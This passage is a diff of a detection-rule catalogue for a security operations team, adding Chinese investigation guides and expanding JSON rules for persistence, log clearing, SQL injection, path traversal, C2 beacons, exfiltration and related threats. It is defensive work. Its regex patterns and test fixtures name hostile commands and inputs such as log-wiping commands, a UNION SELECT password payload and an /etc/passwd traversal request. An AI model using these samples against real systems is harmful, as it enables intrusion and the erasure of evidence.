+        "sysmon",
+        "windows",
+        "edr"
+      ],
+      "mitre": [
+        "T1053.005"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1053/005/"
+      ],
+      "spec": {
+        "id": "PERSIST-TASK",
+        "name": "Scheduled task persistence",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Scheduled task persistence on {host}: {msg}",
+        "mitre": "T1053.005",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(schtasks.*(/create|create)|scheduled task.*created)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "task create",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "sysmon",
+              "host": "win-3",
+              "msg": "schtasks /create /tn Update /tr powershell",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "task run",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "sysmon",
+              "host": "win-3",
+              "msg": "scheduled task Update started",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 审查计划任务的动作、参数与触发器；\n2. 确认创建该任务的进程与操作账号；\n3. 未知的任务禁用后，在同类主机上检索同手法条目。",
+      "falsePositives": [
+        "企业端点管理（SCCM/Intune/GPO）的合法任务下发",
+        "软件自更新机制注册的任务"
+      ]
     },
     {
       "id": "EVADE-LOGCLEAR",
@@ -257,11 +959,63 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Clear or remove security logs.",
-      "dataSources": ["windows", "auditd", "edr"],
-      "mitre": ["T1070.001"],
-      "references": ["https://attack.mitre.org/techniques/T1070/001/"],
-      "spec": {"id": "EVADE-LOGCLEAR", "name": "Log clearing", "type": "pattern", "severity": "CRITICAL", "message": "Log clearing on {host}: {msg}", "mitre": "T1070.001", "match": [{"field": "msg", "op": "regex", "value": "(?i)(wevtutil cl|clear-eventlog|history -c|rm -f /var/log)"}]},
-      "tests": [{"name": "wevtutil clear", "expectAlert": true, "events": [{"source": "windows", "host": "win-4", "msg": "wevtutil cl Security", "fields": {}}]}, {"name": "log rotate", "expectAlert": false, "events": [{"source": "linux", "host": "linux-5", "msg": "logrotate completed", "fields": {}}]}]
+      "dataSources": [
+        "windows",
+        "auditd",
+        "edr"
+      ],
+      "mitre": [
+        "T1070.001"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1070/001/"
+      ],
+      "spec": {
+        "id": "EVADE-LOGCLEAR",
+        "name": "Log clearing",
+        "type": "pattern",
+        "severity": "CRITICAL",
+        "message": "Log clearing on {host}: {msg}",
+        "mitre": "T1070.001",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(wevtutil cl|clear-eventlog|history -c|rm -f /var/log)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "wevtutil clear",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "windows",
+              "host": "win-4",
+              "msg": "wevtutil cl Security",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "log rotate",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "linux",
+              "host": "linux-5",
+              "msg": "logrotate completed",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 立即确认清空/删除日志的操作者、方式与影响的日志类别；\n2. 隔离主机，转而收集 EDR/网络/邻接主机的取证数据；\n3. 视为攻击掩盖行为处理：排查横向移动与数据外传；\n4. 恢复日志采集并核查采集代理状态。",
+      "falsePositives": [
+        "日志滚动策略与合规保留周期的合法清理",
+        "日志系统维护窗口的手动清理"
+      ]
     },
     {
       "id": "IOC-BLOCKED-IP",
@@ -269,11 +1023,67 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Activity from an operator-maintained blocked IP list.",
-      "dataSources": ["firewall", "proxy", "auth"],
-      "mitre": ["T1071"],
-      "references": ["https://attack.mitre.org/techniques/T1071/"],
-      "spec": {"id": "IOC-BLOCKED-IP", "name": "Blocked IP activity", "type": "pattern", "severity": "CRITICAL", "message": "Blocked IP activity: {msg}", "mitre": "T1071", "match": [{"field": "src_ip", "op": "inlist", "value": "blocked_ips"}]},
-      "tests": [{"name": "blocked address", "expectAlert": true, "events": [{"source": "firewall", "host": "fw-1", "msg": "connection denied", "fields": {"src_ip": "10.0.0.66"}}]}, {"name": "normal address", "expectAlert": false, "events": [{"source": "firewall", "host": "fw-1", "msg": "connection allowed", "fields": {"src_ip": "198.51.100.50"}}]}]
+      "dataSources": [
+        "firewall",
+        "proxy",
+        "auth"
+      ],
+      "mitre": [
+        "T1071"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1071/"
+      ],
+      "spec": {
+        "id": "IOC-BLOCKED-IP",
+        "name": "Blocked IP activity",
+        "type": "pattern",
+        "severity": "CRITICAL",
+        "message": "Blocked IP activity: {msg}",
+        "mitre": "T1071",
+        "match": [
+          {
+            "field": "src_ip",
+            "op": "inlist",
+            "value": "blocked_ips"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "blocked address",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "firewall",
+              "host": "fw-1",
+              "msg": "connection denied",
+              "fields": {
+                "src_ip": "10.0.0.66"
+              }
+            }
+          ]
+        },
+        {
+          "name": "normal address",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "firewall",
+              "host": "fw-1",
+              "msg": "connection allowed",
+              "fields": {
+                "src_ip": "198.51.100.50"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认通信方向（入站/出站）、目标端口与业务归属；\n2. 出站命中立即隔离主机并阻断目的地址；\n3. 核对封禁列表条目的情报来源与时效，追溯该 IP 的首次出现时间。",
+      "falsePositives": [
+        "威胁情报中已过期或被误报的 IP 条目",
+        "CDN/共享云出口 IP 被整段列入名单"
+      ]
     },
     {
       "id": "WEB-SQLI",
@@ -281,11 +1091,68 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "SQL injection indicators in web requests.",
-      "dataSources": ["nginx", "waf", "web"],
-      "mitre": ["T1190"],
-      "references": ["https://attack.mitre.org/techniques/T1190/"],
-      "spec": {"id": "WEB-SQLI", "name": "SQL injection", "type": "pattern", "severity": "HIGH", "message": "Possible SQL injection on {host}: {msg}", "mitre": "T1190", "match": [{"field": "source", "op": "eq", "value": "web"}, {"field": "msg", "op": "regex", "value": "(?i)(union\\s+select|sleep\\s*\\(|or\\s+1=1|select.*from)"}]},
-      "tests": [{"name": "union select", "expectAlert": true, "events": [{"source": "web", "host": "web-1", "msg": "GET /?id=1 union select password from users", "fields": {}}]}, {"name": "normal query", "expectAlert": false, "events": [{"source": "web", "host": "web-1", "msg": "GET /health 200", "fields": {}}]}]
+      "dataSources": [
+        "nginx",
+        "waf",
+        "web"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1190/"
+      ],
+      "spec": {
+        "id": "WEB-SQLI",
+        "name": "SQL injection",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Possible SQL injection on {host}: {msg}",
+        "mitre": "T1190",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "web"
+          },
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(union\\s+select|sleep\\s*\\(|or\\s+1=1|select.*from)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "union select",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "web",
+              "host": "web-1",
+              "msg": "GET /?id=1 union select password from users",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "normal query",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "web",
+              "host": "web-1",
+              "msg": "GET /health 200",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认请求是否已被 WAF 拦截；未被拦截的需按应急流程处理；\n2. 排查后端数据库审计与同请求参数的异常查询；\n3. 以 payload 指纹与来源 IP 扩展狩猎，确认是否为批量探测的一部分。",
+      "falsePositives": [
+        "安全扫描器的探测流量",
+        "业务参数中合法包含 SQL 关键字的请求"
+      ]
     },
     {
       "id": "WEB-TRAVERSAL",
@@ -293,11 +1160,63 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Directory traversal and sensitive file access.",
-      "dataSources": ["nginx", "waf", "web"],
-      "mitre": ["T1006"],
-      "references": ["https://attack.mitre.org/techniques/T1006/"],
-      "spec": {"id": "WEB-TRAVERSAL", "name": "Path traversal", "type": "pattern", "severity": "HIGH", "message": "Possible path traversal on {host}: {msg}", "mitre": "T1006", "match": [{"field": "msg", "op": "regex", "value": "(?i)(\\.\\./|%2e%2e|/etc/passwd|win.ini)"}]},
-      "tests": [{"name": "passwd read", "expectAlert": true, "events": [{"source": "web", "host": "web-2", "msg": "GET /../../etc/passwd", "fields": {}}]}, {"name": "static asset", "expectAlert": false, "events": [{"source": "web", "host": "web-2", "msg": "GET /assets/app.js", "fields": {}}]}]
+      "dataSources": [
+        "nginx",
+        "waf",
+        "web"
+      ],
+      "mitre": [
+        "T1006"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1006/"
+      ],
+      "spec": {
+        "id": "WEB-TRAVERSAL",
+        "name": "Path traversal",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Possible path traversal on {host}: {msg}",
+        "mitre": "T1006",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(\\.\\./|%2e%2e|/etc/passwd|win.ini)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "passwd read",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "web",
+              "host": "web-2",
+              "msg": "GET /../../etc/passwd",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "static asset",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "web",
+              "host": "web-2",
+              "msg": "GET /assets/app.js",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认请求试图读取的文件与是否成功（响应码/长度）；\n2. 排查同一来源的其他路径尝试；\n3. 修复应用的路径规范化校验，并对敏感目录做访问控制。",
+      "falsePositives": [
+        "静态资源编码参数的误报",
+        "备份/同步工具的目录枚举"
+      ]
     },
     {
       "id": "C2-BEACON",
@@ -305,11 +1224,85 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Repeated command-and-control beacon indicators from one host.",
-      "dataSources": ["proxy", "edr", "dns"],
-      "mitre": ["T1071.001"],
-      "references": ["https://attack.mitre.org/techniques/T1071/001/"],
-      "spec": {"id": "C2-BEACON", "name": "C2 beacon", "type": "threshold", "severity": "HIGH", "message": "Host {key} emitted {count} C2 indicators", "keyField": "host", "routingField": "host", "threshold": 4, "window": "300s", "mitre": "T1071.001", "match": [{"field": "msg", "op": "regex", "value": "(?i)(beacon|cobaltstrike|command-and-control|periodic callback)"}]},
-      "tests": [{"name": "beacon burst", "expectAlert": true, "events": [{"source": "proxy", "host": "endpoint-1", "msg": "periodic beacon callback", "fields": {}}, {"source": "proxy", "host": "endpoint-1", "msg": "periodic beacon callback", "fields": {}}, {"source": "proxy", "host": "endpoint-1", "msg": "periodic beacon callback", "fields": {}}, {"source": "proxy", "host": "endpoint-1", "msg": "periodic beacon callback", "fields": {}}]}, {"name": "normal proxy", "expectAlert": false, "events": [{"source": "proxy", "host": "endpoint-2", "msg": "GET /api/status 200", "fields": {}}]}]
+      "dataSources": [
+        "proxy",
+        "edr",
+        "dns"
+      ],
+      "mitre": [
+        "T1071.001"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1071/001/"
+      ],
+      "spec": {
+        "id": "C2-BEACON",
+        "name": "C2 beacon",
+        "type": "threshold",
+        "severity": "HIGH",
+        "message": "Host {key} emitted {count} C2 indicators",
+        "keyField": "host",
+        "routingField": "host",
+        "threshold": 4,
+        "window": "300s",
+        "mitre": "T1071.001",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(beacon|cobaltstrike|command-and-control|periodic callback)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "beacon burst",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "proxy",
+              "host": "endpoint-1",
+              "msg": "periodic beacon callback",
+              "fields": {}
+            },
+            {
+              "source": "proxy",
+              "host": "endpoint-1",
+              "msg": "periodic beacon callback",
+              "fields": {}
+            },
+            {
+              "source": "proxy",
+              "host": "endpoint-1",
+              "msg": "periodic beacon callback",
+              "fields": {}
+            },
+            {
+              "source": "proxy",
+              "host": "endpoint-1",
+              "msg": "periodic beacon callback",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "normal proxy",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "proxy",
+              "host": "endpoint-2",
+              "msg": "GET /api/status 200",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 立即隔离主机并阻断目的域名/IP；\n2. 用固定间隔+抖动的特征在同一网段扩展狩猎同类主机；\n3. 检查主机的持久化、凭据与外传量；\n4. 向情报团队确认域名归属。",
+      "falsePositives": [
+        "NTP/监控类固定间隔外联（需加入白名单）",
+        "心跳型 SaaS 客户端的周期请求"
+      ]
     },
     {
       "id": "EXFIL-LARGE",
@@ -317,11 +1310,87 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Repeated large upload indicators from one source.",
-      "dataSources": ["proxy", "netflow", "dlp"],
-      "mitre": ["T1041"],
-      "references": ["https://attack.mitre.org/techniques/T1041/"],
-      "spec": {"id": "EXFIL-LARGE", "name": "Large data exfiltration", "type": "threshold", "severity": "HIGH", "message": "Source {key} generated {count} large uploads", "keyField": "src_ip", "routingField": "src_ip", "threshold": 3, "window": "300s", "mitre": "T1041", "match": [{"field": "msg", "op": "contains", "value": "large_upload"}]},
-      "tests": [{"name": "three uploads", "expectAlert": true, "events": [{"source": "proxy", "host": "proxy-1", "msg": "large_upload 100MB", "fields": {"src_ip": "198.51.100.60"}}, {"source": "proxy", "host": "proxy-1", "msg": "large_upload 100MB", "fields": {"src_ip": "198.51.100.60"}}, {"source": "proxy", "host": "proxy-1", "msg": "large_upload 100MB", "fields": {"src_ip": "198.51.100.60"}}]}, {"name": "small upload", "expectAlert": false, "events": [{"source": "proxy", "host": "proxy-1", "msg": "upload 1MB", "fields": {"src_ip": "198.51.100.61"}}]}]
+      "dataSources": [
+        "proxy",
+        "netflow",
+        "dlp"
+      ],
+      "mitre": [
+        "T1041"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1041/"
+      ],
+      "spec": {
+        "id": "EXFIL-LARGE",
+        "name": "Large data exfiltration",
+        "type": "threshold",
+        "severity": "HIGH",
+        "message": "Source {key} generated {count} large uploads",
+        "keyField": "src_ip",
+        "routingField": "src_ip",
+        "threshold": 3,
+        "window": "300s",
+        "mitre": "T1041",
+        "match": [
+          {
+            "field": "msg",
+            "op": "contains",
+            "value": "large_upload"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "three uploads",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "proxy",
+              "host": "proxy-1",
+              "msg": "large_upload 100MB",
+              "fields": {
+                "src_ip": "198.51.100.60"
+              }
+            },
+            {
+              "source": "proxy",
+              "host": "proxy-1",
+              "msg": "large_upload 100MB",
+              "fields": {
+                "src_ip": "198.51.100.60"
+              }
+            },
+            {
+              "source": "proxy",
+              "host": "proxy-1",
+              "msg": "large_upload 100MB",
+              "fields": {
+                "src_ip": "198.51.100.60"
+              }
+            }
+          ]
+        },
+        {
+          "name": "small upload",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "proxy",
+              "host": "proxy-1",
+              "msg": "upload 1MB",
+              "fields": {
+                "src_ip": "198.51.100.61"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认上传目的域名/服务与被传数据的分类级别；\n2. 核对业务是否允许该方向与量级的外传；\n3. 结合 DLP 命中与文件类型判断是否为真实外传；\n4. 确认违规时阻断通道并评估数据范围。",
+      "falsePositives": [
+        "备份/网盘同步的大文件上传",
+        "视频会议与内容分发产生的正常大流量"
+      ]
     },
     {
       "id": "DOS-FLOOD",
@@ -329,11 +1398,103 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "High-volume flood indicators targeting one destination.",
-      "dataSources": ["firewall", "netflow", "waf"],
-      "mitre": ["T1498"],
-      "references": ["https://attack.mitre.org/techniques/T1498/"],
-      "spec": {"id": "DOS-FLOOD", "name": "Network flood", "type": "threshold", "severity": "HIGH", "message": "Destination {key} received {count} flood indicators", "keyField": "dst_ip", "routingField": "dst_ip", "threshold": 5, "window": "30s", "mitre": "T1498", "match": [{"field": "msg", "op": "contains", "value": "flood"}]},
-      "tests": [{"name": "flood burst", "expectAlert": true, "events": [{"source": "firewall", "host": "fw-2", "msg": "syn flood", "fields": {"dst_ip": "203.0.113.20"}}, {"source": "firewall", "host": "fw-2", "msg": "syn flood", "fields": {"dst_ip": "203.0.113.20"}}, {"source": "firewall", "host": "fw-2", "msg": "syn flood", "fields": {"dst_ip": "203.0.113.20"}}, {"source": "firewall", "host": "fw-2", "msg": "syn flood", "fields": {"dst_ip": "203.0.113.20"}}, {"source": "firewall", "host": "fw-2", "msg": "syn flood", "fields": {"dst_ip": "203.0.113.20"}}]}, {"name": "single packet", "expectAlert": false, "events": [{"source": "firewall", "host": "fw-2", "msg": "normal packet", "fields": {"dst_ip": "203.0.113.20"}}]}]
+      "dataSources": [
+        "firewall",
+        "netflow",
+        "waf"
+      ],
+      "mitre": [
+        "T1498"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1498/"
+      ],
+      "spec": {
+        "id": "DOS-FLOOD",
+        "name": "Network flood",
+        "type": "threshold",
+        "severity": "HIGH",
+        "message": "Destination {key} received {count} flood indicators",
+        "keyField": "dst_ip",
+        "routingField": "dst_ip",
+        "threshold": 5,
+        "window": "30s",
+        "mitre": "T1498",
+        "match": [
+          {
+            "field": "msg",
+            "op": "contains",
+            "value": "flood"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "flood burst",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "firewall",
+              "host": "fw-2",
+              "msg": "syn flood",
+              "fields": {
+                "dst_ip": "203.0.113.20"
+              }
+            },
+            {
+              "source": "firewall",
+              "host": "fw-2",
+              "msg": "syn flood",
+              "fields": {
+                "dst_ip": "203.0.113.20"
+              }
+            },
+            {
+              "source": "firewall",
+              "host": "fw-2",
+              "msg": "syn flood",
+              "fields": {
+                "dst_ip": "203.0.113.20"
+              }
+            },
+            {
+              "source": "firewall",
+              "host": "fw-2",
+              "msg": "syn flood",
+              "fields": {
+                "dst_ip": "203.0.113.20"
+              }
+            },
+            {
+              "source": "firewall",
+              "host": "fw-2",
+              "msg": "syn flood",
+              "fields": {
+                "dst_ip": "203.0.113.20"
+              }
+            }
+          ]
+        },
+        {
+          "name": "single packet",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "firewall",
+              "host": "fw-2",
+              "msg": "normal packet",
+              "fields": {
+                "dst_ip": "203.0.113.20"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认被攻击目标、协议与业务影响面；\n2. 在边界启用清洗/限速并协调上游 ISP；\n3. 排查是否为勒索式 DDoS 前奏（结合邮件与其他告警）；\n4. 记录攻击带宽与时长作为容量证据。",
+      "falsePositives": [
+        "授权压力测试",
+        "内网大文件同步/备份窗口的流量高峰"
+      ]
     },
     {
       "id": "CORR-FAIL-SUDO",
@@ -341,11 +1502,93 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "A failed authentication followed by privilege escalation for one user.",
-      "dataSources": ["auth", "auditd", "linux"],
-      "mitre": ["T1110", "T1548"],
-      "references": ["https://attack.mitre.org/techniques/T1548/"],
-      "spec": {"id": "CORR-FAIL-SUDO", "name": "Failed login followed by sudo", "type": "correlation", "severity": "CRITICAL", "message": "User {key} failed login then used sudo", "keyField": "user", "routingField": "user", "window": "300s", "mitre": "T1548", "steps": [[{"field": "source", "op": "eq", "value": "auth"}, {"field": "msg", "op": "contains", "value": "Failed password"}], [{"field": "msg", "op": "contains", "value": "sudo:"}]]},
-      "tests": [{"name": "failed then sudo", "expectAlert": true, "events": [{"source": "auth", "host": "linux-6", "msg": "Failed password", "fields": {"user": "alice"}}, {"source": "auditd", "host": "linux-6", "msg": "sudo: alice executed /bin/sh", "fields": {"user": "alice"}}]}, {"name": "sudo only", "expectAlert": false, "events": [{"source": "auditd", "host": "linux-6", "msg": "sudo: alice executed /bin/ls", "fields": {"user": "bob"}}]}]
+      "dataSources": [
+        "auth",
+        "auditd",
+        "linux"
+      ],
+      "mitre": [
+        "T1110",
+        "T1548"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1548/"
+      ],
+      "spec": {
+        "id": "CORR-FAIL-SUDO",
+        "name": "Failed login followed by sudo",
+        "type": "correlation",
+        "severity": "CRITICAL",
+        "message": "User {key} failed login then used sudo",
+        "keyField": "user",
+        "routingField": "user",
+        "window": "300s",
+        "mitre": "T1548",
+        "steps": [
+          [
+            {
+              "field": "source",
+              "op": "eq",
+              "value": "auth"
+            },
+            {
+              "field": "msg",
+              "op": "contains",
+              "value": "Failed password"
+            }
+          ],
+          [
+            {
+              "field": "msg",
+              "op": "contains",
+              "value": "sudo:"
+            }
+          ]
+        ]
+      },
+      "tests": [
+        {
+          "name": "failed then sudo",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "auth",
+              "host": "linux-6",
+              "msg": "Failed password",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "source": "auditd",
+              "host": "linux-6",
+              "msg": "sudo: alice executed /bin/sh",
+              "fields": {
+                "user": "alice"
+              }
+            }
+          ]
+        },
+        {
+          "name": "sudo only",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "auditd",
+              "host": "linux-6",
+              "msg": "sudo: alice executed /bin/ls",
+              "fields": {
+                "user": "bob"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认该账号是否被撞库成功后立即提权；\n2. 冻结账号、轮换凭据并审查 sudoers/组变更；\n3. 排查提权后的命令与会话归属。",
+      "falsePositives": [
+        "共享服务账号在密码轮换窗口的短暂失败",
+        "运维输错密码后的正常提权流程"
+      ]
     },
     {
       "id": "RISK-ENTITY-SPIKE",
@@ -353,11 +1596,89 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Repeated high-risk findings for one entity become an investigation signal.",
-      "dataSources": ["alert", "risk"],
-      "mitre": ["T1078"],
-      "references": ["https://attack.mitre.org/techniques/T1078/"],
-      "spec": {"id": "RISK-ENTITY-SPIKE", "name": "Entity risk accumulation", "type": "threshold", "severity": "CRITICAL", "message": "Entity {key} accumulated {count} high-risk findings", "keyField": "user", "routingField": "user", "threshold": 3, "window": "600s", "mitre": "T1078", "match": [{"field": "risk_level", "op": "inlist", "value": "high_risk_entities"}]},
-      "tests": [{"name": "three high-risk findings", "expectAlert": true, "events": [{"source": "alert", "host": "risk-1", "msg": "risk finding", "fields": {"user": "alice", "risk_level": "HIGH"}}, {"source": "alert", "host": "risk-1", "msg": "risk finding", "fields": {"user": "alice", "risk_level": "CRITICAL"}}, {"source": "alert", "host": "risk-1", "msg": "risk finding", "fields": {"user": "alice", "risk_level": "HIGH"}}]}, {"name": "one low risk finding", "expectAlert": false, "events": [{"source": "alert", "host": "risk-1", "msg": "risk finding", "fields": {"user": "bob", "risk_level": "LOW"}}]}]
+      "dataSources": [
+        "alert",
+        "risk"
+      ],
+      "mitre": [
+        "T1078"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1078/"
+      ],
+      "spec": {
+        "id": "RISK-ENTITY-SPIKE",
+        "name": "Entity risk accumulation",
+        "type": "threshold",
+        "severity": "CRITICAL",
+        "message": "Entity {key} accumulated {count} high-risk findings",
+        "keyField": "user",
+        "routingField": "user",
+        "threshold": 3,
+        "window": "600s",
+        "mitre": "T1078",
+        "match": [
+          {
+            "field": "risk_level",
+            "op": "inlist",
+            "value": "high_risk_entities"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "three high-risk findings",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "alert",
+              "host": "risk-1",
+              "msg": "risk finding",
+              "fields": {
+                "user": "alice",
+                "risk_level": "HIGH"
+              }
+            },
+            {
+              "source": "alert",
+              "host": "risk-1",
+              "msg": "risk finding",
+              "fields": {
+                "user": "alice",
+                "risk_level": "CRITICAL"
+              }
+            },
+            {
+              "source": "alert",
+              "host": "risk-1",
+              "msg": "risk finding",
+              "fields": {
+                "user": "alice",
+                "risk_level": "HIGH"
+              }
+            }
+          ]
+        },
+        {
+          "name": "one low risk finding",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "alert",
+              "host": "risk-1",
+              "msg": "risk finding",
+              "fields": {
+                "user": "bob",
+                "risk_level": "LOW"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 打开实体风险画像，逐项核对贡献因子与权重；\n2. 优先处置贡献最高的底层告警，而非直接关闭本告警；\n3. 确认实体是否为服务账号/批处理账户（行为天然波动，需调整基线）。",
+      "falsePositives": [
+        "批量作业窗口导致服务账号的风险因子集中累积"
+      ]
     },
     {
       "id": "RARE-PROCESS",
@@ -365,11 +1686,119 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "A host executes a process not observed during its learning period.",
-      "dataSources": ["sysmon", "auditd", "edr"],
-      "mitre": ["T1059"],
-      "references": ["https://attack.mitre.org/techniques/T1059/"],
-      "spec": {"id": "RARE-PROCESS", "name": "Rare process on host", "type": "rare", "severity": "HIGH", "message": "Host {key} executed first-seen {field}={value} after {observed} observations", "keyField": "host", "routingField": "host", "valueField": "process", "warmup": 3, "mitre": "T1059", "match": [{"field": "source", "op": "regex", "value": "(?i)^(sysmon|auditd|edr)$"}]},
-      "tests": [{"name": "first-seen process after warmup", "expectAlert": true, "events": [{"source": "edr", "host": "endpoint-rare-1", "msg": "process start", "fields": {"process": "bash"}}, {"source": "edr", "host": "endpoint-rare-1", "msg": "process start", "fields": {"process": "curl"}}, {"source": "edr", "host": "endpoint-rare-1", "msg": "process start", "fields": {"process": "python"}}, {"source": "edr", "host": "endpoint-rare-1", "msg": "process start", "fields": {"process": "socat"}}]}, {"name": "known process after warmup", "expectAlert": false, "events": [{"source": "edr", "host": "endpoint-rare-2", "msg": "process start", "fields": {"process": "bash"}}, {"source": "edr", "host": "endpoint-rare-2", "msg": "process start", "fields": {"process": "curl"}}, {"source": "edr", "host": "endpoint-rare-2", "msg": "process start", "fields": {"process": "python"}}, {"source": "edr", "host": "endpoint-rare-2", "msg": "process start", "fields": {"process": "bash"}}]}]
+      "dataSources": [
+        "sysmon",
+        "auditd",
+        "edr"
+      ],
+      "mitre": [
+        "T1059"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1059/"
+      ],
+      "spec": {
+        "id": "RARE-PROCESS",
+        "name": "Rare process on host",
+        "type": "rare",
+        "severity": "HIGH",
+        "message": "Host {key} executed first-seen {field}={value} after {observed} observations",
+        "keyField": "host",
+        "routingField": "host",
+        "valueField": "process",
+        "warmup": 3,
+        "mitre": "T1059",
+        "match": [
+          {
+            "field": "source",
+            "op": "regex",
+            "value": "(?i)^(sysmon|auditd|edr)$"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "first-seen process after warmup",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "edr",
+              "host": "endpoint-rare-1",
+              "msg": "process start",
+              "fields": {
+                "process": "bash"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "endpoint-rare-1",
+              "msg": "process start",
+              "fields": {
+                "process": "curl"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "endpoint-rare-1",
+              "msg": "process start",
+              "fields": {
+                "process": "python"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "endpoint-rare-1",
+              "msg": "process start",
+              "fields": {
+                "process": "socat"
+              }
+            }
+          ]
+        },
+        {
+          "name": "known process after warmup",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "edr",
+              "host": "endpoint-rare-2",
+              "msg": "process start",
+              "fields": {
+                "process": "bash"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "endpoint-rare-2",
+              "msg": "process start",
+              "fields": {
+                "process": "curl"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "endpoint-rare-2",
+              "msg": "process start",
+              "fields": {
+                "process": "python"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "endpoint-rare-2",
+              "msg": "process start",
+              "fields": {
+                "process": "bash"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 核对进程哈希、签名与厂商信誉；\n2. 审查父进程与完整命令行；\n3. 与主机变更记录/发布系统对照；\n4. 无法解释时隔离并采集取证。",
+      "falsePositives": [
+        "新版本发布引入的新二进制",
+        "开发/测试人员在非生产主机的手动操作"
+      ]
     },
     {
       "id": "RARE-DOMAIN",
@@ -377,11 +1806,119 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "A host contacts a destination domain not observed during its learning period.",
-      "dataSources": ["dns", "proxy", "edr"],
-      "mitre": ["T1071.004"],
-      "references": ["https://attack.mitre.org/techniques/T1071/004/"],
-      "spec": {"id": "RARE-DOMAIN", "name": "Rare destination domain", "type": "rare", "severity": "MEDIUM", "message": "Host {key} contacted first-seen {field}={value}", "keyField": "host", "routingField": "host", "valueField": "dst_domain", "warmup": 3, "mitre": "T1071.004", "match": [{"field": "source", "op": "regex", "value": "(?i)^(dns|proxy|edr)$"}]},
